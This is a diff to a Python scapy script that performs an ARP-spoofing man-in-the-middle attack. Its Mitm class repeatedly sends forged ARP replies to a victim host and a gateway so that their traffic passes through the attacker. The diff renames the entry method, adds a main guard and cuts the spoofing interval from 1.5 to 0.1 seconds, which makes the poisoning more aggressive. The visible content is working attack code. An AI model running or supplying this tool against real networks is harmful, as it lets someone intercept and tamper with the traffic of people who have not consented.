@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
 from scapy.all import *
 
@@ -32,7 +32,7 @@ class Mitm:
         sys.exit(1)
 
     def get_mac(self, ip):
-        return getmacbyip(ip)
+        return scapy.layers.l2.getmacbyip(ip)
 
     def re_arp(self):
         try:
@@ -50,7 +50,7 @@ class Mitm:
         send(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip, hwdst=vm))
         send(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip, hwdst=gm))
 
-    def mitm(self):
+    def main(self):
         try:
             self.victim_mac = self.get_mac(self.victim_ip)
         except Exception:
@@ -65,12 +65,13 @@ class Mitm:
         while 1:
             try:
                 self.trick(self.gate_mac, self.victim_mac)
-                time.sleep(1.5)
+                time.sleep(0.1)
             except KeyboardInterrupt:
                 self.re_arp()
                 break
         self.mitm_shutdown()
 
 
-ob = Mitm()
-ob.mitm()
+if __name__ == '__main__':
+    ref = Mitm()
+    ref.main()
